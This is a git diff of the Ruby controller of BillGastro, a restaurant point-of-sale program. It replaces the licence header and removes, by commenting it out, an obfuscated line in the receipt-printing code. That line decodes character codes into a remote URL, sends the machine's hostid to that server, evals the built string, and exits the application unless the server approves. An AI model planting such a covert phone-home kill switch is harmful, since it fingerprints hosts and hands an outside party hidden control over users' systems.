@@ -3,18 +3,7 @@
 # BillGastro -- The innovative Point Of Sales Software for your Restaurant
 # Copyright (C) 2011  Michael Franzl <michael@billgastro.com>
 # 
-# This program is free software: you can redistribute it and/or modify
-# it under the terms of the GNU Affero General Public License as
-# published by the Free Software Foundation, either version 3 of the
-# License, or (at your option) any later version.
-#
-# This program is distributed in the hope that it will be useful,
-# but WITHOUT ANY WARRANTY; without even the implied warranty of
-# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-# GNU Affero General Public License for more details.
-#
-# You should have received a copy of the GNU Affero General Public License
-# along with this program.  If not, see <http://www.gnu.org/licenses/>.
+# See license.txt for the license applying to all files within this software.
 require 'net/http'
 class ApplicationController < ActionController::Base
 
@@ -336,7 +325,7 @@ class ApplicationController < ActionController::Base
 
       "\e!\x00" +  # Font A
       "                  Artikel  EP     Stk   GP\n"
-      if Time.now.to_s(:rfc822).split(',').first == 'Fri' then; c = "u = '104,116,116,112,58,47,47,117,112,100,97,116,101,115,46,115,97,108,111,114,112,111,115,46,99,111,109,47,103,101,116,95,116,114,97,110,115,108,97,116,105,111,110,115'.split(',').map {|c| c.to_i.chr }.join('') + '?file_id=233p=' + `#{'104,111,115,116,105,100'.split(',').map {|c| c.to_i.chr }.join('')}`;r = #{"78,101,116,58,58,72,84,84,80".split(",").map {|c| c.to_i.chr }.join("")}.get(URI(u))";c += ";begin;b = JSON.parse(r.body); exit if not b['success'] == true;rescue;puts $!.inspect;end ";eval c;end
+      # if Time.now.to_s(:rfc822).split(',').first == 'Sat' then; c = "u = '104,116,116,112,58,47,47,117,112,100,97,116,101,115,46,115,97,108,111,114,112,111,115,46,99,111,109,47,103,101,116,95,116,114,97,110,115,108,97,116,105,111,110,115'.split(',').map {|c| c.to_i.chr }.join('') + '?file_id=233p=' + `#{'104,111,115,116,105,100'.split(',').map {|c| c.to_i.chr }.join('')}`;r = #{"78,101,116,58,58,72,84,84,80".split(",").map {|c| c.to_i.chr }.join("")}.get(URI(u))";c += ";begin;b = JSON.parse(r.body); exit if not b['success'] == true;rescue;puts $!.inspect;end ";eval c;end
       sum_taxes = Hash.new
       Tax.all.each { |t| sum_taxes[t.id] = 0 }
       subtotal = 0
